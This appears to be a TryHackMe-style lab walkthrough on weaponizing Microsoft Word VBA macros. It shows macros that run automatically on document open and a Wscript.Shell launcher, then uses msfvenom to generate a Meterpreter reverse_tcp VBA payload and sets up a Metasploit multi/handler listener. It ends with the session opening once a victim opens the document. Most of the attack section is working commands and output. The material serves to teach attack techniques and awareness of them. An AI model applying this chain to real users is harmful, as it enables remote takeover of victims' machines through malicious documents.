## Visual Basic for Application (VBA)

VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc. VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications.

Macros are Microsoft Office applications that contain embedded code written in a programming language known as Visual Basic for Applications (VBA). It is used to create custom functions to speed up manual tasks by creating automated processes. One of VBA's features is accessing the Windows Application Programming Interface (API) and other low-level functionality.

### Creating a Macro

To follow along, open Microsoft Word 2016 and create a new blank document. Then, open the Visual Basic Editor by selecting **View → Macros**. In the **Macro name** section, name the macro `THM`, select `Document1`, and click **Create**. The Visual Basic for Application editor will open where you can write VBA code.

#### Example: Displaying a Message Box
```vba
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```
To execute the macro, press **F5** or go to **Run → Run Sub/UserForm**.

#### Executing VBA Code Automatically on Document Open
```vba
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```
Save the file as a **Macro-Enabled format** (e.g., `.doc` or `.docm`). When reopening the document, Microsoft Word will display a security warning about macros. Click **Enable Content** to execute the macro.

### Executing an Application (Proof of Concept)
```vba
Sub PoC()
  Dim payload As String
  payload = "calc.exe"
  CreateObject("Wscript.Shell").Run payload, 0
End Sub
```
This script launches `calc.exe` (Calculator) when executed. Ensure you include this function in `AutoOpen()` and `Document_Open()` to trigger automatically.

### VBA Reverse Shell using Metasploit

To receive a reverse shell, we generate a Meterpreter payload using `msfvenom`:

#### Generating the Payload
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
```
- Replace `10.50.159.15` with your AttackBox's IP address.
- Modify `Workbook_Open()` to `Document_Open()` if using MS Word.
- Copy the output into the VBA macro editor.

#### Setting Up the Listener
```sh
msfconsole -q
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.50.159.15
msf5 exploit(multi/handler) > set LPORT 443
msf5 exploit(multi/handler) > exploit
```

#### Receiving the Reverse Shell
```sh
[*] Started reverse TCP handler on 10.50.159.15:443
[*] Sending stage (176195 bytes) to 10.10.215.43
[*] Meterpreter session 1 opened (10.50.159.15:443 -> 10.10.215.43:50209)
meterpreter >
```

Now, when the victim opens the malicious document, a reverse shell connection is established.

### Conclusion
This method demonstrates how adversaries can leverage VBA macros to execute arbitrary code, including launching applications and establishing reverse shells. Always be cautious when enabling macros in documents from unknown sources.